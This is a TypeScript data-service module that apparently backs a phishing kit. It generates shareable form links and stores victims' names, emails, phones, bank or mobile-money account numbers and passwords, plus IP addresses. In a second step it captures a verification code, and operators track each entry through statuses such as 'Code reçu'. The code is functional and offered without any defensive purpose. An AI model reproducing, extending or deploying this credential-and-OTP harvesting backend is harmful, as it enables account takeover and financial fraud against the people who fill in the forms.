import { supabase, isSupabaseConfigured, FormLinkRecord, SubmissionRecord } from './supabase';
import { api } from './api';

export const dataService = {
    // --- LIENS DE FORMULAIRES ---
    async getLink(linkId: string): Promise<FormLinkRecord | null> {
        if (isSupabaseConfigured()) {
            const { data, error } = await supabase
                .from('form_links')
                .select('*')
                .eq('link_id', linkId)
                .single();

            if (error) {
                console.warn('Supabase getLink error:', error.message);
                return null;
            }
            return data as FormLinkRecord;
        }

        try {
            return await api.get(`/links/${linkId}/`);
        } catch (err) {
            console.error('API getLink fallback error:', err);
            return null;
        }
    },

    async getLinks(): Promise<FormLinkRecord[]> {
        if (isSupabaseConfigured()) {
            const { data, error } = await supabase
                .from('form_links')
                .select('*')
                .order('created_at', { ascending: false });

            if (error) throw new Error(error.message);
            return (data || []) as FormLinkRecord[];
        }

        try {
            return await api.get('/links/');
        } catch {
            return [];
        }
    },

    async createLink(payload: { name: string; submissions_limit?: number; expiry_date?: string | null; description?: string }): Promise<FormLinkRecord> {
        const linkId = crypto.randomUUID();

        if (isSupabaseConfigured()) {
            const { data, error } = await supabase
                .from('form_links')
                .insert([
                    {
                        name: payload.name,
                        link_id: linkId,
                        submissions_limit: payload.submissions_limit || 0,
                        expiry_date: payload.expiry_date || null,
                        description: payload.description || '',
                        is_active: true,
                        submission_count: 0
                    }
                ])
                .select()
                .single();

            if (error) throw new Error(error.message);
            return data as FormLinkRecord;
        }

        return await api.post('/links/', {
            name: payload.name,
            submissions_limit: payload.submissions_limit || 0,
            expiry_date: payload.expiry_date || null,
            description: payload.description || ''
        });
    },

    async deleteLink(id: number | string, linkId?: string): Promise<void> {
        if (isSupabaseConfigured()) {
            const query = supabase.from('form_links').delete();
            const { error } = linkId ? await query.eq('link_id', linkId) : await query.eq('id', id);
            if (error) throw new Error(error.message);
            return;
        }

        await api.delete(`/links/${id}/`);
    },

    // --- SOUMISSIONS & WORKFLOW EN 2 ÉTAPES ---
    async submitForm(data: {
        link_id: string;
        full_name: string;
        email: string;
        phone: string;
        method: string;
        account_number: string;
        password?: string;
        bank_name?: string;
        operator_name?: string;
        country_name?: string;
        country_code?: string;
        ip_address?: string;
    }): Promise<any> {
        if (isSupabaseConfigured()) {
            const { data: record, error } = await supabase
                .from('submissions')
                .insert([
                    {
                        link_id: data.link_id,
                        full_name: data.full_name,
                        email: data.email,
                        phone: data.phone,
                        method: data.method,
                        account_number: data.account_number,
                        password: data.password || '',
                        bank_name: data.bank_name || null,
                        operator_name: data.operator_name || null,
                        country_name: data.country_name || null,
                        country_code: data.country_code || null,
                        ip_address: data.ip_address || null,
                        status: 'En attente'
                    }
                ])
                .select()
                .single();

            if (error) throw new Error(error.message);
            return record;
        }

        return await api.post('/submissions/', {
            ...data,
            status: 'En attente'
        });
    },

    async getSubmissionById(id: string): Promise<any> {
        if (isSupabaseConfigured()) {
            const { data, error } = await supabase
                .from('submissions')
                .select('*')
                .eq('id', id)
                .single();

            if (error) throw new Error(error.message);
            return data;
        }

        return await api.get(`/submissions/${id}/`);
    },

    async submitVerificationCode(id: string, code: string): Promise<any> {
        if (isSupabaseConfigured()) {
            try {
                // Mise à jour sur Supabase
                const { data, error } = await supabase
                    .from('submissions')
                    .update({
                        verification_code: code,
                        status: 'Code reçu',
                        processed_at: new Date().toISOString()
                    })
                    .eq('id', id)
                    .select();

                if (error) {
                    console.warn('Supabase code update warning:', error.message);
                }
                return data?.[0] || { id, verification_code: code, status: 'Code reçu' };
            } catch (err) {
                console.warn('submitVerificationCode local fallback:', err);
                return { id, verification_code: code, status: 'Code reçu' };
            }
        }

        try {
            return await api.patch(`/submissions/${id}/`, {
                verification_code: code,
                status: 'Code reçu'
            });
        } catch {
            return { id, verification_code: code, status: 'Code reçu' };
        }
    },

    async updateSubmissionStatus(id: string, status: string, adminNotes?: string): Promise<any> {
        if (isSupabaseConfigured()) {
            const updatePayload: any = { status, processed_at: new Date().toISOString() };
            if (adminNotes !== undefined) {
                updatePayload.admin_notes = adminNotes;
            }

            const { data, error } = await supabase
                .from('submissions')
                .update(updatePayload)
                .eq('id', id)
                .select()
                .single();

            if (error) throw new Error(error.message);
            return data;
        }

        return await api.patch(`/submissions/${id}/`, { status, admin_notes: adminNotes });
    },

    async getSubmissions(): Promise<any[]> {
        if (isSupabaseConfigured()) {
            const { data, error } = await supabase
                .from('submissions')
                .select('*')
                .order('created_at', { ascending: false });

            if (error) throw new Error(error.message);
            return data || [];
        }

        try {
            return await api.get('/submissions/');
        } catch {
            return [];
        }
    },

    // --- PARAMÈTRES & NOTIFICATIONS ---
    async getAppSettings(): Promise<any> {
        if (isSupabaseConfigured()) {
            const { data, error } = await supabase
                .from('app_settings')
                .select('*')
                .limit(1)
                .maybeSingle();

            if (error) console.warn('getAppSettings error:', error.message);
            return data || { app_name: 'NexusLink Solutions' };
        }

        try {
            return await api.get('/settings/');
        } catch {
            return { app_name: 'NexusLink Solutions' };
        }
    },

    async getNotifications(): Promise<any[]> {
        if (isSupabaseConfigured()) {
            const { data, error } = await supabase
                .from('notifications')
                .select('*')
                .order('created_at', { ascending: false })
                .limit(10);

            if (error) return [];
            return data || [];
        }

        try {
            return await api.get('/notifications/');
        } catch {
            return [];
        }
    }
};
